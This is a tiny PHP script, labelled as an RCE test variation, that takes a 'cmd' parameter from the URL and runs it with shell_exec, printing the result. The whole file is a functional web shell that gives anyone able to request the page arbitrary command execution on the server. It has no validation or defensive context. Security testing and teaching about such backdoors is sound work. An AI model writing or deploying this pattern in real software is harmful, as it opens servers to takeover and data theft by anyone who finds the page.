<?php
// RCE test variation #1496
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>